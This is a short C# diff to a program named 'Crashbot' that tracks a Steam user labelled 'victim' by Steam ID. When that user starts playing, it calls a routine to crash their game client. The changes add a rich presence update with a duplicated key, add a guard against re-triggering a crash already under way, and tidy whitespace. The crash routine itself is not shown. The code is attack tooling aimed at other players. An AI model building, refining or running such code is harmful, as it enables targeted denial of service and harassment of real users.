@@ -83,7 +83,7 @@ namespace Crashbot
             {
                 AutoResetEvent Step = new(false);
 
-                void onSettingsLoaded(PrivacyState _) 
+                void onSettingsLoaded(PrivacyState _)
                 {
                     Step.Set();
                     victim.PrivacySettingsChanged -= onSettingsLoaded;
@@ -103,6 +103,11 @@ namespace Crashbot
                 Console.WriteLine($"Now watching {name} ({v.SteamId})...", Verbosity.Normal);
 
                 this.ResetVictimTracking(interuptSource, victim);
+                victim.OnRichPresenceUpdate(new()
+                {
+                    ["d"] = "h",
+                    ["d"] = "h"
+                });
             }
         }
 
@@ -119,7 +124,7 @@ namespace Crashbot
             // wait for RP and fast track
             void onGameChange(bool isPlaying)
             {
-                if (isPlaying)
+                if (isPlaying && !victim.IsCrashing)
                 {
                     this.CrashClientAsync(victim, interuptSource);
                 }
@@ -132,7 +137,6 @@ namespace Crashbot
                 }
             };
 
-            
             victim.GameStateChanged += onGameChange;
             victim.FasterTracking(interuptSource.Token);
 
